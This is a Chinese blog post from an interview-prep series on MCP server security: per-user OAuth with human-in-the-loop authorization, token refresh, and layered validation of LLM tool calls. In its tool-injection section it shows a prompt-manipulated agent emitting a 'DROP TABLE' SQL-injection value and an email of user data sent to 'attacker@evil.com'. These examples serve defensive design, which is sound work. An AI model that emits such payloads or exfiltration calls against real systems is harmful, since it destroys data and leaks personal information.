---
title: "FDE 面試準備指南（十七）：RKK 實戰——MCP 伺服器、Tool-Calling 安全與 OAuth 授權"
date: 2026-06-04T10:00:00+08:00
draft: false
description: "以系統設計視角拆解 MCP（Model Context Protocol）的安全邊界：Agent 的工具授權架構、Human-in-the-loop OAuth 流程、Tool Input Validation 防禦層，以及如何防止 Tool Injection 攻擊"
categories: ["engineering", "ai", "all"]
tags: ["AI", "FDE", "Agent", "MCP", "OAuth", "Tool-Calling", "Security", "System Design", "RKK", "Interview", "Google"]
authors: ["yen"]
readTime: "17 min"
---

> MCP 不只是「讓 Agent 能呼叫更多工具」。  
> 它是一個**標準化的工具暴露協定**，解決的核心問題是：  
> 怎麼讓 Agent 在有授權控制的情況下，安全地代表用戶執行企業內部操作。

---

## 面試情境

> **面試官：** 「JD 提到了 MCP。客戶希望 Agent 透過 MCP Server 調用 Salesforce 與 ERP 系統。某些 Tool-calling 需要特定員工的 OAuth 權限。你如何在 Agent 工作流中處理這個個人身分授權？如果發生憑證過期或 Tool Injection，你如何防禦？」

---

## 一、核心問題：為什麼 Tool-Calling 的授權比想像中複雜

```
傳統 API 呼叫的授權模型：

  User → Frontend → Backend (with service account key)
                       ↑
                  一個 key，所有人共用
                  問題：無法追蹤是誰做了什麼操作

Agent Tool-Calling 的授權需求：

  User A → Agent → Salesforce API
                       ↑
                  必須用 User A 的身分操作
                  原因：
                  ├── Salesforce 的記錄所有者是 User A
                  ├── 操作日誌要顯示 User A 做了什麼
                  └── User A 可能沒有修改某些欄位的權限
```

**三個具體的授權挑戰：**

```
挑戰 1：User Impersonation（身分代入）
  Agent 必須以 User A 的身分（而非系統帳號）呼叫 Salesforce

挑戰 2：Least Privilege（最小權限）
  Agent 只應獲得完成當前任務所需的最小 OAuth Scope

挑戰 3：Token 生命週期
  OAuth Access Token 有效期通常 1 小時
  長任務執行到一半，Token 過期 → 任務中斷
```

---

## 二、MCP 架構：什麼是 Model Context Protocol

```
傳統 Tool-Calling 架構（非 MCP）：

  Agent → [Tool List in Prompt] → LLM → [Raw JSON call] → Tool Code
                                                               ↑
                                                       工具直接嵌在 Agent 裡
                                                       難以統一管理和授權

MCP 架構：

  Agent                  MCP Server              Enterprise Systems
    │                        │                         │
    │  "我需要查 Salesforce" │                         │
    │ ──────────────────────→│                         │
    │                        │  驗證 OAuth Token       │
    │                        │ ──────────────────────→ │
    │                        │  ← 查詢結果              │
    │ ← 標準化回應格式 ───── │                         │
    │                        │
  Agent 不直接知道              MCP Server 負責：
  後端系統的實作細節            ├── 工具定義（Tool Schema）
                              ├── 授權驗證（OAuth）
                              ├── 輸入驗證（Validation）
                              └── 呼叫企業 API

MCP 的核心價值：
  ├── 工具標準化：任何 LLM 都能用同一套協定呼叫工具
  ├── 授權集中管理：授權邏輯在 MCP Server，不在 Agent
  └── 可審計：所有工具呼叫都通過統一閘道，完整日誌
```

---

## 三、完整授權架構設計

```
┌──────────────────────────────────────────────────────────────┐
│                        用戶端                                 │
│   User → Frontend App                                        │
└──────────────────────────┬───────────────────────────────────┘
                           │ 1. 用戶登入，取得 Session Token
                           ▼
┌──────────────────────────────────────────────────────────────┐
│                    API Gateway Layer                          │
│                                                              │
│   ├── 驗證 Session Token                                     │
│   ├── 將 User Identity 注入請求 Header                       │
│   └── 轉發到 Agent Orchestrator                              │
└──────────────────────────┬───────────────────────────────────┘
                           │ 2. 附帶 user_id
                           ▼
┌──────────────────────────────────────────────────────────────┐
│                  Agent Orchestrator（LangGraph）              │
│                                                              │
│   Agent 執行中 → 決定需要呼叫 Salesforce Tool                │
│                           │                                  │
│                           ▼                                  │
│   ┌────────────────────────────────────────────────────┐    │
│   │           Human-in-the-Loop (HITL) 節點            │    │
│   │                                                    │    │
│   │   3. Agent 進入 Interrupt 狀態                     │    │
│   │   4. 系統向前端推送 OAuth 授權請求                  │    │
│   │      「請點擊以授權連接您的 Salesforce 帳號」        │    │
│   │   5. 等待用戶點擊並完成 OAuth Flow                  │    │
│   │   6. 收到 Access Token，注入 Tool Execution Context │    │
│   │   7. Agent Resume，繼續執行                         │    │
│   └────────────────────────────────────────────────────┘    │
└──────────────────────────┬───────────────────────────────────┘
                           │ 8. 附帶 OAuth Access Token
                           ▼
┌──────────────────────────────────────────────────────────────┐
│                      MCP Server                              │
│                                                              │
│   ┌──────────────────┐    ┌───────────────────────────────┐  │
│   │ Input Validator  │    │ OAuth Token Validator         │  │
│   │ (JSON Schema /   │    │ ├── Token 是否過期？           │  │
│   │  Pydantic)       │    │ ├── Scope 是否足夠？           │  │
│   └──────────────────┘    │ └── Refresh if needed        │  │
│                           └───────────────────────────────┘  │
│                                      │                       │
│                                      ▼                       │
│                            呼叫 Salesforce / ERP API         │
└──────────────────────────────────────────────────────────────┘
```

---

## 四、Human-in-the-Loop OAuth 流程細節

### 為什麼需要 HITL，而不能預先取得 Token

```
預先取得 Token 的問題：

  方案：用戶登入時就取得所有工具的 OAuth Token
  問題：
  ├── 要求用戶「預先授權所有可能用到的系統」→ 體驗差
  ├── Token 長期存儲 → 安全風險
  └── 用戶可能根本不需要用到某些工具

HITL OAuth 的優點：
  ├── Just-in-time 授權：只在真的需要時才申請
  ├── 最小 Scope：只申請完成當前任務所需的 Scope
  └── 用戶明確知道 Agent 要做什麼（透明度）
```

### Token 過期的處理

```
Token 生命週期管理架構：

  MCP Server 的 Token 管理邏輯：

  收到 Tool Call 請求
       │
       ▼
  ┌────────────────────────────────────────┐
  │  驗證 Access Token                     │
  │  ├── 未過期 → 直接使用                  │
  │  ├── 已過期 + 有 Refresh Token         │
  │  │       → 使用 Refresh Token 取得新   │
  │  │         Access Token（透明更新）     │
  │  └── 已過期 + 無 Refresh Token         │
  │           → 回傳 AUTH_REQUIRED 狀態    │
  │             → Agent 觸發新的 HITL 流程 │
  └────────────────────────────────────────┘

  設計原則：
  ├── Refresh Token 用加密方式存在 Secret Manager
  ├── Access Token 只存在記憶體（不寫磁碟）
  └── 每次 Token Refresh 都寫入 Audit Log
```

---

## 五、Tool Injection 防禦：Input Validation 層

```
Tool Injection 攻擊示意：

  正常場景：
  LLM 輸出 → { "tool": "update_crm", "params": { "customer_id": "C123", "status": "contacted" } }
  結果：正常更新 CRM

  Injection 攻擊（LLM 被 Prompt 操控）：
  LLM 輸出 → { "tool": "update_crm", "params": { "customer_id": "C123; DROP TABLE customers; --", "status": "contacted" } }
  如果直接傳給 API → SQL Injection！

  或者：
  LLM 輸出 → { "tool": "send_email", "params": { "to": "attacker@evil.com", "body": "用戶個資" } }
  如果 to 欄位沒有驗證 → 資料外洩！
```

### 三層 Input Validation 設計

```
Layer 1：Schema Validation（結構驗證）
  ├── LLM 輸出的 JSON 是否符合預定的 Schema？
  ├── 必填欄位是否存在？
  └── 欄位型別是否正確？

  customer_id: 必須是 "C" + 6位數字 → C123456
               如果不符合格式 → 拒絕執行

Layer 2：Business Logic Validation（業務邏輯驗證）
  ├── email to 欄位是否在允許的域名清單？
  │     → 只允許 @company.com 的郵件地址
  ├── 金額是否在合理範圍？
  │     → 單筆不超過預設上限，超過觸發人工審核
  └── 是否嘗試存取不屬於當前用戶的資源？
        → customer_id 是否屬於當前登入用戶的客戶？

Layer 3：Rate Limiting + Anomaly Detection
  ├── 同一個 session 內，工具被呼叫次數是否異常？
  └── 參數模式是否符合正常使用行為？

這三層全部在 MCP Server 的 Middleware 裡實作，
LLM 產生的 JSON 不能直接進入企業 API。
```

---

## 六、架構選型：OAuth 方案比較

```
方案比較：

                服務帳號 Key      OAuth 2.0 PKCE      OAuth 2.0 Device Flow
──────────────────────────────────────────────────────────────────────────
誰的身分         系統帳號          真實用戶身分          真實用戶身分
授權粒度         整個系統           per-user scope       per-user scope
Token 存儲      長期（危險）        短期（15min~1hr）    短期
適合場景         後台自動化          Web App Agent        CLI / IoT Agent
個人化操作        ❌                ✅                   ✅
操作審計         ❌（都是系統帳號）  ✅（有 user_id）     ✅
GDPR 合規        ❌                ✅                   ✅

FDE 推薦：
  Web/Mobile App 上的 Agent → OAuth 2.0 PKCE（標準 Web Flow）
  Server-side 長任務 Agent  → OAuth 2.0 with Refresh Token
  完全自動化的後台任務       → 服務帳號（但最小權限）
```

---

## 七、GCP 落地設計

```
GCP 組件對應：

  OAuth Token 存儲    → Secret Manager（加密，有版本管理）
  MCP Server 部署     → Cloud Run（無伺服器，自動擴展）
  Input Validation    → 在 Cloud Run 的 Middleware 實作
  Audit Logging       → Cloud Logging + Cloud Audit Logs
  Rate Limiting       → Apigee API Gateway（有內建 quota 管理）
  Token 快取          → Memorystore Redis（避免頻繁查詢 Secret Manager）
```

---

## 八、面試答題要點

> *「這個問題有三個層次：*
>
> *第一，User Impersonation（身分代入）：Agent 必須以真實用戶身分而非系統帳號呼叫企業 API。我的設計是 HITL OAuth 流程——當 Agent 第一次需要呼叫需要授權的工具時，進入 Interrupt 狀態，觸發 OAuth 授權請求，用戶確認後 Token 注入 Tool Execution Context，Agent 才繼續執行。Token 使用 Refresh Token 機制透明更新，過期時自動換取新 Token。*
>
> *第二，Tool Injection 防禦：LLM 產生的 JSON 參數絕對不能直接傳給企業 API。MCP Server 中間層要做三層驗證：Schema 驗證（格式是否合法）、Business Logic 驗證（業務規則，例如金額上限、郵件域名白名單）、異常偵測（呼叫頻率是否正常）。*
>
> *第三，最小權限：每次 OAuth 請求只申請完成當前任務所需的最小 Scope，Token 只存在記憶體，不寫磁碟，所有操作完整 Audit Log。」*

---

**系列導覽：**  
← [（十六）RKK 實戰：Multi-Agent 狀態管理與死鎖排除](../fde-interview-guide-part16-multiagent-state-deadlock-zh/)  
→ [（十八）RKK 實戰：Agent 記憶體架構與 Context 成本調優](../fde-interview-guide-part18-memory-cost-tuning-zh/)
